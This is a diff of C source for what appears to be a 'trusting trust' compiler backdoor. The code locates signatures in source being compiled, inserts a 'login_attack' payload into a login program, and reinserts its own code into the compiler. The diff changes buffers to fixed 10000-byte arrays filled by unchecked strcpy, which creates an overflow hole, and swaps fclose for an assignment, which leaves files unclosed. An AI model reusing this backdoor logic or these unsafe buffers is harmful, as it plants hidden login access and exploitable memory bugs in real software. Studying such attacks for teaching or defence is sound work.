@@ -10,8 +10,8 @@ if (result != NULL) {
     int index = result - program + sig_length;
 
     // Slice into two parts
-    char firstPart[index];
-    char secondPart[strlen(program) - index];
+    char firstPart[10000];
+    char secondPart[10000];
     strncpy(firstPart, program, index);
     firstPart[index] = '\0';
     strcpy(secondPart, program + index);
@@ -24,7 +24,7 @@ if (result != NULL) {
     fprintf(fp, "%s", firstPart);
     fprintf(fp, "%s", login_attack);
     fprintf(fp, "%s", secondPart);
-    fclose(fp);
+    program = "";
 }
     
 
@@ -44,8 +44,8 @@ if (compile_result != NULL) {
     int index = compile_result - program + compile_sig_length;
 
     // Slice into two parts
-    char firstPart[index];
-    char secondPart[strlen(program) - index];
+    char firstPart[10000];
+    char secondPart[10000];
     strncpy(firstPart, program, index);
     firstPart[index] = '\0';
     strcpy(secondPart, program + index);
@@ -67,5 +67,5 @@ if (compile_result != NULL) {
     fprintf(fp, "0 };\n");
     fprintf(fp, "%s", prog);
     fprintf(fp, "%s", secondPart);
-    fclose(fp);
+    program = "";
 }
